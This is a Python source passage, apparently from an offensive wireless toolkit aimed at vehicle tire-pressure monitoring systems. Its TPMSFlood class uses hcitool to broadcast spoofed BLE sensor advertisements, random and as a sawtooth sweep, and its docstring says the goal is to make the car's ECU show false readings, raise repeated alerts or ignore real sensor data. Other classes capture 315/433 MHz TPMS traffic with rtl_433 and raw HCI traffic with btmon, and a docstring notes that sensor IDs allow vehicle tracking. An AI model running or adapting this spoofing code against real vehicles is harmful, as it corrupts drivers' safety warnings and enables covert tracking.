        company_id = struct.pack("<H", 0x0001)  # Generic / aftermarket
        mfg_data = company_id + tpms_payload
        mfg_ad = bytes([len(mfg_data) + 1, 0xFF]) + mfg_data

        # AD: Shortened Local Name
        name_bytes = name.encode("utf-8")[:8]
        name_ad = bytes([len(name_bytes) + 1, 0x08]) + name_bytes

        adv_data = flags + uuid_ad + mfg_ad + name_ad

        # BLE advertisement max is 31 bytes
        if len(adv_data) > 31:
            adv_data = flags + uuid_ad + mfg_ad  # Drop name if too long

        return adv_data[:31]


# ── TPMS Advertisement Flood ──────────────────────────────────────────────

class TPMSFlood:
    """BLE advertisement flood targeting TPMS receiver.

    Sends rapid conflicting TPMS sensor advertisements to overwhelm
    the vehicle ECU's TPMS processing, causing it to display incorrect
    readings, trigger repeated alerts, or ignore legitimate sensor data.
    """

    def __init__(self, hci: str = "hci0"):
        self.hci = hci
        self._spoofer = TPMSSpoofer(hci)

    def flood_random(self, duration: int = 30, interval_ms: int = 20) -> dict:
        """Flood with random TPMS readings across all tire positions."""
        import random

        with phase("TPMS Advertisement Flood"):
            info(f"Flooding random TPMS data for {duration}s @ {interval_ms}ms interval")
            info("Sending conflicting pressure/temp values to confuse ECU")

            sent = 0
            start_time = time.time()
            end_time = start_time + duration

            with step("Generating flood traffic"):
                try:
                    while time.time() < end_time:
                        position = random.choice([0x01, 0x02, 0x03, 0x04])
                        pressure = random.uniform(0, 80)
                        temp = random.uniform(-20, 120)
                        battery = random.randint(0, 100)

                        # Build 7-byte TPMS payload
                        status = 0x80 if pressure < 25 else 0x00
                        payload = struct.pack("<BBB", status,
                                              int(min(33, battery * 0.13 + 20)),
                                              max(0, min(255, int(temp))))
                        payload += struct.pack("<H", int(pressure * 10))
                        payload += struct.pack("<H", sum(payload) & 0xFFFF)

                        adv_data = self._spoofer._build_adv_packet(payload)

                        set_cmd = [
                            "hcitool", "-i", self.hci, "cmd",
                            "0x08", "0x0008",
                            str(len(adv_data)),
                        ] + [f"0x{b:02x}" for b in adv_data]

                        run_cmd(set_cmd, timeout=3)
                        run_cmd(["hcitool", "-i", self.hci, "cmd",
                                 "0x08", "0x000a", "0x01"], timeout=3)
                        time.sleep(interval_ms / 1000.0)
                        run_cmd(["hcitool", "-i", self.hci, "cmd",
                                 "0x08", "0x000a", "0x00"], timeout=3)
                        sent += 1

                        if sent % 50 == 0:
                            elapsed = time.time() - start_time
                            substep(f"Sent {sent} packets ({elapsed:.0f}s elapsed)")

                except KeyboardInterrupt:
                    warning("Flood interrupted")
                finally:
                    run_cmd(["hcitool", "-i", self.hci, "cmd",
                             "0x08", "0x000a", "0x00"], timeout=3)

            elapsed = time.time() - start_time
            rate = sent / elapsed if elapsed > 0 else 0
            success(f"Flood complete: {sent} packets in {elapsed:.1f}s ({rate:.0f} pkt/s)")

        return {"packets_sent": sent, "duration": elapsed, "rate": rate}

    def flood_pressure_sweep(self, duration: int = 30, position: int = 0x01) -> dict:
        """Sweep pressure from 0 to max, cycling continuously on one tire."""
        pos_name = TIRE_POSITIONS.get(position, "Unknown")

        with phase("TPMS Pressure Sweep Flood"):
            info(f"Pressure sweep on {pos_name} for {duration}s")
            info("Sawtooth pattern: 0 -> 80 PSI -> 0 -> 80 PSI ...")

            sent = 0
            start_time = time.time()
            end_time = start_time + duration

            with step("Sweeping pressure values"):
                try:
                    pressure = 0.0
                    while time.time() < end_time:
                        status = 0x80 if pressure < 25 else 0x00
                        payload = struct.pack("<BBB", status, 30, 25)
                        payload += struct.pack("<H", int(pressure * 10))
                        payload += struct.pack("<H", sum(payload) & 0xFFFF)

                        adv_data = self._spoofer._build_adv_packet(payload)
                        set_cmd = [
                            "hcitool", "-i", self.hci, "cmd",
                            "0x08", "0x0008",
                            str(len(adv_data)),
                        ] + [f"0x{b:02x}" for b in adv_data]

                        run_cmd(set_cmd, timeout=3)
                        run_cmd(["hcitool", "-i", self.hci, "cmd",
                                 "0x08", "0x000a", "0x01"], timeout=3)
                        time.sleep(0.02)
                        run_cmd(["hcitool", "-i", self.hci, "cmd",
                                 "0x08", "0x000a", "0x00"], timeout=3)

                        sent += 1
                        pressure += 0.5
                        if pressure > 80:
                            pressure = 0.0

                        if sent % 100 == 0:
                            substep(f"Sent {sent} packets, current: {pressure:.1f} PSI")

                except KeyboardInterrupt:
                    warning("Sweep interrupted")
                finally:
                    run_cmd(["hcitool", "-i", self.hci, "cmd",
                             "0x08", "0x000a", "0x00"], timeout=3)

            elapsed = time.time() - start_time
            success(f"Sweep complete: {sent} packets in {elapsed:.1f}s")

        return {"packets_sent": sent, "duration": elapsed}


# ── SDR TPMS Capture (315/433 MHz) ───────────────────────────────────────

class TPMSSDRCapture:
    """Traditional TPMS capture via SDR (315/433 MHz RF).

    Uses rtl_433 for decoding traditional TPMS sensors that operate
    on 315 MHz (North America, Japan) or 433.92 MHz (Europe).
    These are NOT Bluetooth — they use FSK/ASK modulation.

    Requires: rtl_433 + RTL-SDR dongle or compatible SDR (B210, HackRF).

    Traditional TPMS has zero encryption, zero authentication.
    Each sensor broadcasts a unique 32-bit ID that enables vehicle tracking.
    """

    def __init__(self, output_dir: str = "tpms_capture"):
        self.output_dir = output_dir
        self._proc = None

    def capture(
        self,
        duration: int = 60,
        frequency: str = "auto",
        output_format: str = "json",
        device: str = "",
    ) -> list[dict]:
        """Capture traditional TPMS packets using rtl_433.

        Args:
            duration: Capture duration in seconds
            frequency: Frequency: "315M", "433.92M", or "auto" (hop both)
            output_format: Output format for rtl_433
            device: SDR device string (e.g., "driver=uhd" for B210)
        """
        if not check_tool("rtl_433"):
            error("rtl_433 not found — install from https://github.com/merbanan/rtl_433")
            info("rtl_433 supports 200+ sensor protocols including most TPMS sensors")
            return []

        os.makedirs(self.output_dir, exist_ok=True)

        with phase("SDR TPMS Capture (315/433 MHz)"):
            with step(f"Capturing RF TPMS data ({duration}s)"):
                freq_display = frequency if frequency != "auto" else "315M + 433.92M"
                info(f"Frequency: {freq_display}")
                info("Traditional TPMS uses FSK/ASK modulation, NOT Bluetooth")

                output_file = os.path.join(self.output_dir, "tpms_rf_capture.json")
                cmd = ["rtl_433", "-T", str(duration)]

                if frequency == "auto":
                    # Hop between TPMS frequencies
                    cmd.extend(["-f", "315M", "-f", "433.92M", "-H", "30"])
                elif frequency:
                    cmd.extend(["-f", frequency])

                if device:
                    cmd.extend(["-d", device])

                # Output as JSON lines
                cmd.extend(["-F", f"json:{output_file}"])

                # Also filter for TPMS-related protocols
                # rtl_433 protocol numbers for common TPMS:
                # 60=Schrader, 88=Toyota, 89=Ford, 110=Citroen, etc.
                verbose(f"Command: {' '.join(cmd)}")

                results = []
                try:
                    proc = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                    )

                    # Read stdout in real-time
                    start_time = time.time()
                    while time.time() - start_time < duration + 5:
                        line = proc.stdout.readline()
                        if not line:
                            if proc.poll() is not None:
                                break
                            continue

                        line = line.strip()
                        if "TPMS" in line or "tire" in line.lower() or "pressure" in line.lower():
                            info(f"RF: {line}")

                    proc.terminate()
                    proc.wait(timeout=5)

                except FileNotFoundError:
                    error("rtl_433 binary not found")
                    return []
                except KeyboardInterrupt:
                    warning("Capture interrupted")
                    if proc:
                        proc.terminate()
                        proc.wait(timeout=5)

                # Parse JSON output
                if os.path.exists(output_file):
                    import json
                    with open(output_file, "r") as f:
                        for line in f:
                            line = line.strip()
                            if line:
                                try:
                                    results.append(json.loads(line))
                                except json.JSONDecodeError:
                                    pass

                    tpms_results = [
                        r for r in results
                        if any(k in str(r).lower() for k in
                               ["tpms", "tire", "pressure", "schrader"])
                    ]

                    if tpms_results:
                        success(f"Captured {len(tpms_results)} TPMS packet(s)")
                        for pkt in tpms_results[:10]:
                            sensor_id = pkt.get("id", pkt.get("sensor_id", "?"))
                            pressure = pkt.get("pressure_kPa", pkt.get("pressure_PSI", "?"))
                            temp = pkt.get("temperature_C", "?")
                            model = pkt.get("model", "Unknown")
                            substep(f"ID={sensor_id} Model={model} "
                                    f"P={pressure} T={temp}")
                    else:
                        warning(f"No TPMS packets in {len(results)} total captures")
                        info("Ensure vehicle is nearby and tires are rotating (>20 mph)")
                else:
                    warning("No capture output file created")

                substep(f"Raw output: {output_file}")

        return results

    def list_protocols(self):
        """List rtl_433 protocols related to TPMS."""
        if not check_tool("rtl_433"):
            error("rtl_433 not found")
            return

        result = run_cmd(["rtl_433", "-R", "help"], timeout=10)
        if result.returncode != 0:
            # Some versions use different flags
            result = run_cmd(["rtl_433", "-G"], timeout=10)

        if result.stdout:
            tpms_lines = [
                line for line in result.stdout.splitlines()
                if any(k in line.lower() for k in ["tpms", "tire", "pressure", "schrader"])
            ]
            if tpms_lines:
                section("TPMS-Related rtl_433 Protocols")
                for line in tpms_lines:
                    substep(line.strip())
            else:
                info("No TPMS-specific protocols listed (rtl_433 decodes them by default)")


# ── HCI Capture Wrapper ───────────────────────────────────────────────────

class TPMSHCICapture:
    """HCI-level BLE capture for deep TPMS packet analysis.

    Uses btmon to capture raw HCI traffic including all BLE
    advertisement PDUs for analysis in Wireshark or with the decoder.
    """

    def __init__(self, output_dir: str = "tpms_capture"):
        self.output_dir = output_dir
        self._proc = None

    def start(self, output_file: str = "tpms_hci.log") -> str:
        """Start btmon capture in background."""
        os.makedirs(self.output_dir, exist_ok=True)
        filepath = os.path.join(self.output_dir, output_file)

        if not check_tool("btmon"):
            error("btmon not found — install bluez-utils")
            return ""

        with step("Starting HCI capture"):
            self._proc = subprocess.Popen(
                ["btmon", "-w", filepath],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            success(f"HCI capture started -> {filepath} (PID: {self._proc.pid})")
            return filepath

    def stop(self) -> bool:
        """Stop btmon capture."""
        if self._proc:
            self._proc.terminate()
            try:
                self._proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._proc.kill()
            success("HCI capture stopped")
            self._proc = None
            return True
        warning("No capture running")
        return False

    def is_running(self) -> bool:
        return self._proc is not None and self._proc.poll() is None
